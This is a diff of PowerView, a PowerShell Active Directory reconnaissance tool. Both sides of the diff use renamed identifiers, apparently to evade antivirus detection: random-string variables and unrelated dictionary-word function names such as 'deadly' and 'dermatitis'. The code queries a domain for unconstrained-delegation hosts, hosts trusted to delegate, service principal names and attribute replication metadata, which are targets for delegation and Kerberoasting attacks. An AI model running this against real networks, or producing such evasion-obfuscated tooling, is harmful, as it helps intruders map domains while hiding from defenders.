-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[doubtlessly] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $fTlnGmRy99 = watersides @SearcherArguments
-                        if (-not $fTlnGmRy99) {
-                            Write-Warning "[doubtlessly] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[sonorous] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $CompSearcher = deadly @SearcherArguments
+                        if (-not $CompSearcher) {
+                            Write-Warning "[sonorous] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($QghnbJOP99.Contains('.')) {
-                    $afFJXkRc99 += "(|(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
-                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
                 else {
-                    $afFJXkRc99 += "(name=$QghnbJOP99)"
+                    $IdentityFilter += "(name=$IdentityInstance)"
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['Unconstrained']) {
-                Write-Verbose '[doubtlessly] Searching for computers with for unconstrained delegation'
-                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+                Write-Verbose '[sonorous] Searching for computers with for unconstrained delegation'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
             }
             if ($PSBoundParameters['TrustedToAuth']) {
-                Write-Verbose '[doubtlessly] Searching for computers that are trusted to authenticate for other principals'
-                $kXbEpVCq99 += '(msds-allowedtodelegateto=*)'
+                Write-Verbose '[sonorous] Searching for computers that are trusted to authenticate for other principals'
+                $Filter += '(msds-allowedtodelegateto=*)'
             }
             if ($PSBoundParameters['Printers']) {
-                Write-Verbose '[doubtlessly] Searching for printers'
-                $kXbEpVCq99 += '(objectCategory=printQueue)'
+                Write-Verbose '[sonorous] Searching for printers'
+                $Filter += '(objectCategory=printQueue)'
             }
             if ($PSBoundParameters['SPN']) {
-                Write-Verbose "[doubtlessly] Searching for computers with SPN: $SPN"
-                $kXbEpVCq99 += "(servicePrincipalName=$SPN)"
+                Write-Verbose "[sonorous] Searching for computers with SPN: $SPN"
+                $Filter += "(servicePrincipalName=$SPN)"
             }
             if ($PSBoundParameters['OperatingSystem']) {
-                Write-Verbose "[doubtlessly] Searching for computers with operating system: $wSsSBiPZ99"
-                $kXbEpVCq99 += "(operatingsystem=$wSsSBiPZ99)"
+                Write-Verbose "[sonorous] Searching for computers with operating system: $OperatingSystem"
+                $Filter += "(operatingsystem=$OperatingSystem)"
             }
             if ($PSBoundParameters['ServicePack']) {
-                Write-Verbose "[doubtlessly] Searching for computers with service pack: $qoqQUCpy99"
-                $kXbEpVCq99 += "(operatingsystemservicepack=$qoqQUCpy99)"
+                Write-Verbose "[sonorous] Searching for computers with service pack: $ServicePack"
+                $Filter += "(operatingsystemservicepack=$ServicePack)"
             }
             if ($PSBoundParameters['SiteName']) {
-                Write-Verbose "[doubtlessly] Searching for computers with site name: $nqApdsmI99"
-                $kXbEpVCq99 += "(serverreferencebl=$nqApdsmI99)"
+                Write-Verbose "[sonorous] Searching for computers with site name: $SiteName"
+                $Filter += "(serverreferencebl=$SiteName)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[doubtlessly] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[sonorous] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
+            $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
-                    $aHFybRCW99 = $_.Substring(4)
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
-                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
+                    $UACField = $_.Substring(4)
+                    $UACValue = [Int]($UACEnum::$UACField)
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
-                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
+                    $UACValue = [Int]($UACEnum::$_)
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
-            $fTlnGmRy99.filter = "(&(samAccountType=805306369)$kXbEpVCq99)"
-            Write-Verbose "[doubtlessly] doubtlessly filter string: $($fTlnGmRy99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $fTlnGmRy99.FindOne() }
-            else { $pfqXXMQd99 = $fTlnGmRy99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
+            Write-Verbose "[sonorous] sonorous filter string: $($CompSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
+            else { $Results = $CompSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 $Up = $True
                 if ($PSBoundParameters['Ping']) {
                     $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                 }
                 if ($Up) {
                     if ($PSBoundParameters['Raw']) {
-                        $cXOPCAwl99 = $_
-                        $cXOPCAwl99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
+                        $Computer = $_
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                     }
                     else {
-                        $cXOPCAwl99 = Buddy -Properties $_.Properties
-                        $cXOPCAwl99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
+                        $Computer = bookie -Properties $_.Properties
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                     }
-                    $cXOPCAwl99
+                    $Computer
                 }
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[doubtlessly] Error disposing of the Results object: $_"
+                    Write-Verbose "[sonorous] Error disposing of the Results object: $_"
                 }
             }
-            $fTlnGmRy99.dispose()
+            $CompSearcher.dispose()
         }
     }
 }
-function farrowing {
+function dermatitis {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObject')]
     [OutputType('PowerView.ADObject.Raw')]
@@ -3112,159 +3112,159 @@ function farrowing {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     DynamicParam {
-        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
-        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
-        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
+        $UACValueNames = [Enum]::GetNames($UACEnum)
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
+        footnotes -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $EihUhexc99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $ObjectSearcher = deadly @SearcherArguments
     }
     PROCESS {
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            coup -CreateVariables -BoundParameters $PSBoundParameters
+            footnotes -CreateVariables -BoundParameters $PSBoundParameters
         }
-        if ($EihUhexc99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^S-1-') {
-                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+        if ($ObjectSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($QghnbJOP99 -match '^(CN|OU|DC)=') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[farrowing] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $EihUhexc99 = watersides @SearcherArguments
-                        if (-not $EihUhexc99) {
-                            Write-Warning "[farrowing] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[dermatitis] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $ObjectSearcher = deadly @SearcherArguments
+                        if (-not $ObjectSearcher) {
+                            Write-Warning "[dermatitis] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($QghnbJOP99.Contains('\')) {
-                    $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
-                    if ($TzefbTEv99) {
-                        $MUJwRPEg99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
-                        $kYMQHBOP99 = $QghnbJOP99.Split('\')[1]
-                        $afFJXkRc99 += "(samAccountName=$kYMQHBOP99)"
-                        $PPosolen99['Domain'] = $MUJwRPEg99
-                        Write-Verbose "[farrowing] Extracted domain '$MUJwRPEg99' from '$QghnbJOP99'"
-                        $EihUhexc99 = watersides @SearcherArguments
+                elseif ($IdentityInstance.Contains('\')) {
+                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | corralling -OutputType Canonical
+                    if ($ConvertedIdentityInstance) {
+                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                        $ObjectName = $IdentityInstance.Split('\')[1]
+                        $IdentityFilter += "(samAccountName=$ObjectName)"
+                        $SearcherArguments['Domain'] = $ObjectDomain
+                        Write-Verbose "[dermatitis] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
+                        $ObjectSearcher = deadly @SearcherArguments
                     }
                 }
-                elseif ($QghnbJOP99.Contains('.')) {
-                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
                 else {
-                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(displayname=$QghnbJOP99))"
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[farrowing] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[dermatitis] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
+            $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
-                    $aHFybRCW99 = $_.Substring(4)
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
-                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
+                    $UACField = $_.Substring(4)
+                    $UACValue = [Int]($UACEnum::$UACField)
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
-                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
+                    $UACValue = [Int]($UACEnum::$_)
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
-            if ($kXbEpVCq99 -and $kXbEpVCq99 -ne '') {
-                $EihUhexc99.filter = "(&$kXbEpVCq99)"
+            if ($Filter -and $Filter -ne '') {
+                $ObjectSearcher.filter = "(&$Filter)"
             }
-            Write-Verbose "[farrowing] farrowing filter string: $($EihUhexc99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $EihUhexc99.FindOne() }
-            else { $pfqXXMQd99 = $EihUhexc99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            Write-Verbose "[dermatitis] dermatitis filter string: $($ObjectSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
+            else { $Results = $ObjectSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
                     $Object = $_
                     $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                 }
                 else {
-                    $Object = Buddy -Properties $_.Properties
+                    $Object = bookie -Properties $_.Properties
                     $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                 }
                 $Object
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[farrowing] Error disposing of the Results object: $_"
+                    Write-Verbose "[dermatitis] Error disposing of the Results object: $_"
                 }
             }
-            $EihUhexc99.dispose()
+            $ObjectSearcher.dispose()
         }
     }
 }
-function pantheistic {
+function predetermines {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObjectAttributeHistory')]
     [CmdletBinding()]
@@ -3272,90 +3272,90 @@ function pantheistic {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'Properties'    =   'msds-replattributemetadata','distinguishedname'
             'Raw'           =   $True
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['FindOne']) { $PPosolen99['FindOne'] = $QtcSidjx99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['Properties']) {
-            $VhjUUHmm99 = $PSBoundParameters['Properties'] -Join '|'
+            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
         }
         else {
-            $VhjUUHmm99 = ''
+            $PropertyFilter = ''
         }
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
-        farrowing @SearcherArguments | ForEach-Object {
-            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
-            ForEach($gsLTSbEi99 in $_.Properties['msds-replattributemetadata']) {
-                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
-                if ($pczMbpLs99) {
-                    if ($pczMbpLs99.pszAttributeName -Match $VhjUUHmm99) {
-                        $ERfozkEO99 = New-Object PSObject
-                        $ERfozkEO99 | Add-Member NoteProperty 'ObjectDN' $HxrwipaH99
-                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeName' $pczMbpLs99.pszAttributeName
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
-                        $ERfozkEO99 | Add-Member NoteProperty 'Version' $pczMbpLs99.dwVersion
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
-                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
-                        $ERfozkEO99
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
+        dermatitis @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
+                if ($TempObject) {
+                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
+                        $Output = New-Object PSObject
+                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
+                        $Output
                     }
                 }
                 else {
-                    Write-Verbose "[pantheistic] Error retrieving 'msds-replattributemetadata' for '$HxrwipaH99'"
+                    Write-Verbose "[predetermines] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                 }
             }
         }
     }
 }
-function Christine {
+function sandlots {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
     [CmdletBinding()]
@@ -3363,92 +3363,92 @@ function Christine {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'Properties'    =   'msds-replvaluemetadata','distinguishedname'
             'Raw'           =   $True
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
